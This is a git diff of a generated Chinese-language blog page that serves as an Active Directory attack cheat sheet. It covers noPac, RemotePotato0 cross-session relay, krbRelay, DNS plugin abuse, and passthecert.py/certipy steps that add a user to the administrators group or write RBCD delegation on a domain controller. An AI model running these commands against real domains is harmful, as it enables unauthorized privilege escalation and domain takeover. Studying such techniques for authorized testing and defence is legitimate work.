+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此证书可用于dc机器用户身份认证，后续思路是直接认证dc用户hash或者传递证书进行rbcd&lt;/p&gt;
+&lt;h3 id=&#34;nopac漏洞&#34;&gt;nopac漏洞
+&lt;/h3&gt;&lt;h4 id=&#34;要求-1&#34;&gt;要求
 &lt;/h4&gt;&lt;p&gt;必须同时存在以下两个漏洞：&lt;/p&gt;
 &lt;p&gt;CVE‑2021‑42278&lt;/p&gt;
 &lt;p&gt;DC 对 不存在的计算机账户名 处理不严&lt;/p&gt;
@@ -1684,12 +1729,12 @@ nxc&lt;/p&gt;
 &lt;p&gt;TGS 校验 sAMAccountName 与 SID 不一致&lt;/p&gt;
 &lt;p&gt;检测命令&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nxc smb  $ip -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$pass&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -M nopac
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;攻击命令&#34;&gt;攻击命令
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;攻击命令-1&#34;&gt;攻击命令
 &lt;/h4&gt;&lt;p&gt;使用工具&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://github.com/Ridter/noPac
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;cross-session-relay-跨会话中继&#34;&gt;Cross Session Relay 跨会话中继
 &lt;/h3&gt;&lt;p&gt;当存在其他用户登陆会话后，可以尝试打跨会话中继获得登陆会话的用户hash&lt;/p&gt;
-&lt;h4 id=&#34;要求-1&#34;&gt;要求
+&lt;h4 id=&#34;要求-2&#34;&gt;要求
 &lt;/h4&gt;&lt;p&gt;无要求，需要确认存在用户登陆会话，最好还要确定目标防火墙规则&lt;/p&gt;
 &lt;h4 id=&#34;remotepotato0exe&#34;&gt;RemotePotato0.exe
 &lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://github.com/antonioCoco/RemotePotato0/releases
@@ -1704,7 +1749,7 @@ nxc&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-p 监听端口
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果防火墙不允许，请不要使用9999&lt;/p&gt;
 &lt;h3 id=&#34;krbrelay域用户提升域管理&#34;&gt;krbRelay(域用户提升域管理)
-&lt;/h3&gt;&lt;h4 id=&#34;要求-2&#34;&gt;要求
+&lt;/h3&gt;&lt;h4 id=&#34;要求-3&#34;&gt;要求
 &lt;/h4&gt;&lt;p&gt;1，具备域用户
 2，没有 2022 年 10 月的补丁
 3，必须禁用 LDAP 签名（这是 Windows 的默认设置）。
@@ -2033,7 +2078,7 @@ nxc&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sc.exe \\$hostname start dns
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果不具备服务重启权限的话，可以利用工具直接重启&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dnscmd.exe &lt;span style=&#34;color:#ae81ff&#34;&gt;127.0&lt;/span&gt;.0.1 /restart
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;注意&#34;&gt;注意
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;注意-1&#34;&gt;注意
 &lt;/h4&gt;&lt;p&gt;2021年更新后的ad无法使用，微软对这一功能进行了加固：&lt;/p&gt;
 &lt;p&gt;ServerLevelPluginDll 参数已被移到受保护的注册表位置（HKLM\SYSTEM\CurrentControlSet\Services\DNS\InternalParameters）。
 只有完全管理员（如 Domain Admins 或 DNS 服务器本地的 Administrators）才能修改它。&lt;/p&gt;
@@ -2385,6 +2430,8 @@ nxc&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain $domain -dc-ip $ip
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输入help可以查看可以使用的命令，但是最常用的还是将以捕获用户直接添加入管理员组，我们一般申请的证书就是管理员证书&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;add_user_to_group $user administrators
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者构造对dc的rbcd&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 passthecert.py -action write_rbcd -crt server.crt -key server.key -domain $domain -dc-ip $dc_ip -delegate-to $dc_fqdn -delegate-from &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;域内掌控机器机器名$&amp;#39;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;certipy-ad-1&#34;&gt;certipy-ad
 &lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certipy-ad auth -pfx dc1.pfx -dc-ip $ip -ldap-shell
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输入help，与passthecert.py利用一致&lt;/p&gt;
